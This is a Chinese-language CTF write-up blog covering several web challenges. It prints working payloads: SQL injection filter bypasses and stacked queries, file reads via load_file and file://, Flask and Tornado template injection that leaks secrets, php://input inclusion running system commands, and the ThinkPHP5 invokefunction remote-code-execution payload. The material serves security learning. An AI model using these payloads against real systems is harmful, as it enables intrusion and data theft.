<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">no</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">未报错</span><br><span class="line">?<span class="keyword">no</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>#</span><br><span class="line">报错</span><br><span class="line"></span><br><span class="line">说明存在注入</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">判断字段数</span><br><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>#</span><br><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span>#</span><br><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span>#</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200408214521930.png" alt="img"></p>
<p>5的时候报错</p>
<p>联合查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>#</span><br></pre></td></tr></table></figure>

<p>有检查</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118123158628.png" alt="image-20221118123158628"></p>
<p>尝试修改大小写，尝试复写union和select，最后发现应该是检测”union select”这个字符串，且不区分大小写。尝试用&#x2F;**&#x2F;或者++替换空格，都可以绕过：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">UniOn</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>#</span><br><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">SelEct</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>#</span><br><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> uunionnion selselectect <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>#     报错</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>#</span><br><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span><span class="operator">+</span><span class="operator">+</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>#</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118123556546.png" alt="image-20221118123556546"></p>
<p>通过页面的返回结果，可以发现第二个字段可以回显利用：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span><span class="operator">+</span><span class="operator">+</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span>,<span class="number">4</span>#</span><br><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span><span class="operator">+</span><span class="operator">+</span><span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span>#</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118124256593.png" alt="image-20221118124256593"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118151404553.png" alt="image-20221118151404553"></p>
<p>用户是root用户，权限很高。尝试读取文件内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,load_file(&quot;/var/www/html/flag.php&quot;),<span class="number">3</span>,<span class="number">4</span>#</span><br></pre></td></tr></table></figure>

<p>没有回显信息，看源码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118151817539.png" alt="image-20221118151817539"></p>
<p>flag{c1e552fdf77049fabf65168f22f7aeab}</p>
<p>另一个方法：</p>
<p>在得到数据库名和用户名之后，查找表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;fakebook&quot;#</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118152012454.png" alt="image-20221118152012454"></p>
<p>找表的字段：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;#</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118152109159.png" alt="image-20221118152109159"></p>
<p>no，username和passwd都知道，data字段的信息不明确，查看</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,group_concat(username,passwd,data),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="keyword">no</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118152211287.png" alt="image-20221118152211287"></p>
<p>最后的data内容很可疑。单独输出下：</p>
<p><img src="https://img-blog.csdnimg.cn/2020040822250016.png" alt="img"></p>
<p>修改对象序列里面的blog参数内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;</span><br></pre></td></tr></table></figure>

<p>用file伪协议读取flag内容交给blog参数，然后你再查看源码，iframe的src发生了变化</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?<span class="keyword">no</span><span class="operator">=</span><span class="number">2</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="operator">%</span><span class="number">27</span>O:<span class="number">8</span>:&quot;UserInfo&quot;:<span class="number">3</span>:&#123;s:<span class="number">4</span>:&quot;name&quot;;s:<span class="number">5</span>:&quot;admin&quot;;s:<span class="number">3</span>:&quot;age&quot;;i:<span class="number">123</span>;s:<span class="number">4</span>:&quot;blog&quot;;s:<span class="number">29</span>:&quot;file:///var/www/html/flag.php&quot;;&#125;<span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200408225329627.png" alt="img"></p>
<p>src成了这么一段东西：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg==</span><br></pre></td></tr></table></figure>

<p>解下码：</p>
<p><img src="https://img-blog.csdnimg.cn/20200408225559178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTAwMjUx,size_16,color_FFFFFF,t_70" alt="img"></p>
<h2 id="12-shrine"><a href="#12-shrine" class="headerlink" title="12.shrine"></a>12.shrine</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118185520310.png" alt="image-20221118185520310"></p>
<p>代码审计</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">/*创建了flask包下的Flask类的对象，name是一个适用于多数情况的快捷方式。有了这个参数，Flask才知道在哪里可以找到模板和静态文件*/</span><br><span class="line">    </span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line">//这句话的意思就是说flag在app的config变量里 </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line">//使用“/”可以访问index()，即刚开始打开的网页</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line">//这个是带参数的写法</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):// 这里shrine的值就是上面的 &lt;path:shrine&gt;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  // 先将 ) 替换为 空，再将 ( 替换为 空</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"> 		//匹配黑名单,将匹配到的config和self换成空字符</span><br><span class="line">        /*python中的join()函数</span><br><span class="line">          join()是一个字符串方法，它返回被子字符串连接的字符串。</span><br><span class="line">          如：</span><br><span class="line">             list1 = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>]                                                                              <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(list1))                                </span><br><span class="line">             会用<span class="string">&quot;&quot;</span>中的字符将字符串连接起来                                                      </span><br><span class="line">             输出：                                                      </span><br><span class="line">             <span class="number">1234</span>  </span><br><span class="line">         */                                                          </span><br><span class="line">         //如果我们输入的内容是url/shrine/&#123;&#123;<span class="number">7</span>+<span class="number">7</span>&#125;&#125;,那么<span class="keyword">return</span>的内容就是：</span><br><span class="line">           &#123;&#123;% <span class="built_in">set</span> config=<span class="literal">None</span>%&#125;&#125;&#123;&#123;% <span class="built_in">set</span> self=<span class="literal">None</span>%&#125;&#125;&#123;&#123;<span class="number">7</span>+<span class="number">7</span>&#125;&#125;。                                                          </span><br><span class="line">                                                                   </span><br><span class="line">                                                                   </span><br><span class="line">                                                                   </span><br><span class="line">                                                                   </span><br><span class="line">                                                                   </span><br><span class="line">                                                                   </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"> 	// 这句话就是调用了过滤函数对用户输入的网址进行过滤</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>尝试模板注入</p>
<p><img src="https://img-blog.csdnimg.cn/58c6dda2b84a41ecb487edc208766f7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA55uQ6Iy2VGVh,size_16,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>有回显，说明存在注入</p>
<p>使用Python内置函数读取全局变量  url_for或者get_flashed_messages</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/91e7ba9c30864ae59248ce46b5fb3662.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA55uQ6Iy2VGVh,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>代码审计的时候有 app.config[‘FLAG’]</p>
<p> python沙箱逃逸的方法是 利用python对象之间的引用关系来调用被禁用的函数对象</p>
<p>构造payloads:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118201142814.png" alt="image-20221118201142814"></p>
<h2 id="13-easytornado"><a href="#13-easytornado" class="headerlink" title="13.easytornado"></a>13.easytornado</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118214630214.png" alt="image-20221118214630214"></p>
<p>查看各个文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118214659686.png" alt="image-20221118214659686"></p>
<p>提示flag在&#x2F;fllllllllllllag里，打开看看</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118215205721.png" alt="image-20221118215205721"></p>
<p>提示错误，看URL，看看是不是有模板注入</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118215305417.png" alt="image-20221118215305417"></p>
<p>有模板注入</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118214710022.png" alt="image-20221118214710022"></p>
<p>render函数是一个Tomado框架的一个渲染函数，即可以通过传递不同的参数形成不同的页面。</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118214719782.png" alt="image-20221118214719782"></p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line"></span><br><span class="line">在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，Handler指向的处理当前这个页面的对象</span><br></pre></td></tr></table></figure>



<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118215707790.png" alt="image-20221118215707790"></p>
<p>得到coolie_secret</p>
<p>加解密</p>
<p><img src="https://img-blog.csdnimg.cn/20210119105156196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI1MzIxNg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118220427534.png" alt="image-20221118220427534"></p>
<p>输入，得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221118220344372.png" alt="image-20221118220344372"></p>
<h2 id="14-supersqli"><a href="#14-supersqli" class="headerlink" title="14.supersqli"></a>14.supersqli</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119091557611.png" alt="image-20221119091557611"></p>
<p>尝试注入</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119091631634.png" alt="image-20221119091631634"></p>
<p>报错，说明存在注入</p>
<p>查询字段</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119091854480.png" alt="image-20221119091854480"></p>
<p>说明有两个字段</p>
<p>查询用户表</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119092109037.png" alt="image-20221119092109037"></p>
<p>报错，提示有过滤，且过滤大小写</p>
<p>使用堆叠注入</p>
<p>先查询所有的数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; show databases; # </span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119092345576.png" alt="image-20221119092345576"></p>
<p>先看看supersqli这个数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;use supersqli;show tables;#</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119092528931.png" alt="image-20221119092528931"></p>
<p>查看纯数字的表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;use supersqli;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure>

<p>当纯数字字符串是表名的时候需要加反引号&#96; </p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119092833628.png" alt="image-20221119092833628">查看flag</p>
<p>字段查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">handler查询法</span><br><span class="line">Handler语法说明：</span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]  打开表，起别名</span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name CLOSE  关闭表</span><br></pre></td></tr></table></figure>

<p> 查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;use supersqli;handler `1919810931114514` open as p;handler p read first;#</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119094225516.png" alt="image-20221119094225516"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">预编译绕过法:</span><br><span class="line">-1&#x27;;</span><br><span class="line">set @sql = CONCAT(&#x27;sele&#x27;,&#x27;ct flag from `1919810931114514`;&#x27;);</span><br><span class="line">prepare stmt from @sql;</span><br><span class="line">EXECUTE stmt;# </span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119094556499.png" alt="image-20221119094556499"></p>
<p>被过滤</p>
<p>但是strstr函数不区分大小写，所以我们可以改一下大小写来绕过strstr函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;</span><br><span class="line">SET @sql = CONCAT(&#x27;sele&#x27;,&#x27;ct flag from `1919810931114514`;&#x27;);</span><br><span class="line">PREPARE stmt from @sql;</span><br><span class="line">EXECUTE stmt;# </span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119094725393.png" alt="image-20221119094725393"></p>
<h2 id="15-Web-php-include"><a href="#15-Web-php-include" class="headerlink" title="15.Web_php_include"></a>15.Web_php_include</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119154917138.png" alt="image-20221119154917138"></p>
<p>利用php伪协议大小写绕过</p>
<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?page=PHP://input</span><br><span class="line">post date:</span><br><span class="line">&lt;?php</span><br><span class="line">system(&quot;ls&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119160116970.png" alt="image-20221119160116970"></p>
<p>查看flag文件</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?page=PHP://input</span><br><span class="line">post date:</span><br><span class="line">&lt;?php</span><br><span class="line">system(&quot;cat fl4gisisish3r3.php&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>查看源代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119160413018.png" alt="image-20221119160413018"></p>
<h2 id="16-php-rce"><a href="#16-php-rce" class="headerlink" title="16.php_rce"></a>16.php_rce</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119162756130.png" alt="image-20221119162756130"></p>
<p>搜索ThinkPHP5已发现的漏洞</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119162900976.png" alt="image-20221119162900976"></p>
<p>漏洞描述：<br>由于ThinkPHP5框架对控制器名没有进行足够的安全检测，导致在没有开启强制路由的情况下，黑客构造特定的请求，可直接GetWebShell。</p>
<p>ThinkPHP路由<br>概括的说：路由就是网络请求的url与thinkphp应用层的逻辑处理地址的对应关系。</p>
<p>通俗的说：路由就是把url的请求优雅的对应到你想要执行的操作方法。</p>
<p>路由其实就是把真实的url地址隐藏起来，使用访问地址来访问应用（网站或OA等）。</p>
<p>通常这样定义：“访问地址”&#x3D;》“真实地址”，这代表了一种映射关系。就好比用“1”代表去肯德基吃饭，用“0”代表去麦当劳吃饭，你预先告知过同事这个规则的话，只需要发送“1”或“0”给同事，同事就能理解要去哪里吃饭，一个道理。</p>
<p>路由的规则是thinkphp规定好的，比如TP的访问规则是：根目录&#x2F;模块&#x2F;控制器&#x2F;方法，那么我们只需要定义一下映射关系“reg”&#x3D;》“index&#x2F;user&#x2F;reg”，此时只需要再浏览器输入“域名&#x2F;reg”就能访问“index模块&#x2F;user&#x2F;控制器&#x2F;reg方法”这个地址了。</p>
<p>这样的优点：</p>
<p>1、没有处理过的url路径都是由 …模块&#x2F;控制器&#x2F;方法&#x2F;参数 构成，如果不加以“掩饰”的话，会被别人看清内部结构，不够安全。</p>
<p>2、可以让url地址更加简洁、优雅、美观。</p>
<p>漏洞分析：<br>这个版本的路由默认使用的是混合模式没有强制开启路由，导致攻击者可以构造特定请求(URL)获取webshell。</p>
<p>这里的源码默认使用的是混合模式，混合模式就是即可自定义路由，也可使用PATH_INFO的方式。</p>
<p>看一下官方给出的修补方案，对控制器实施了过滤。</p>
<p><img src="https://img-blog.csdnimg.cn/2020031315461749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="图六"></p>
<p>追踪一下$controller变量</p>
<p><img src="https://img-blog.csdnimg.cn/20200313154637230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="图七"></p>
<p>这里对静态方法controller实例化了，继续追踪loader</p>
<p><img src="https://img-blog.csdnimg.cn/20200313154703503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="图八"></p>
<p>找到controller方法</p>
<p><img src="https://img-blog.csdnimg.cn/20200313154728950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="图九"></p>
<p>这里判断了如果存在name就实例化，我们继续追踪getModuleAndClass</p>
<p><img src="https://img-blog.csdnimg.cn/20200313154756306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="图十"></p>
<p>这个方法会将module和class返回,用于实例化,利用命名空间的特点，如果可以控制此处,如果可以控制此处的class,也就是补丁里的controller，就可以实例化任意类。如果我们设置控制器为\think\App,可以构造payload调用其方法invokeFuction。</p>
<p><img src="https://img-blog.csdnimg.cn/20200313154820792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="图十一"></p>
<p>Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br></pre></td></tr></table></figure>

<p>这里用到了一个php的全局回调函数</p>
<p><img src="https://img-blog.csdnimg.cn/20200313154857608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="图十二"></p>
<p>接下来就是如何设置controller为\think\App<br>来到获取控制器名<br>其中把result[1]的值传递到$ control中</p>
<p><img src="https://img-blog.csdnimg.cn/2020031315492214.png" alt="在这里插入图片描述"></p>
<p>找到module方法</p>
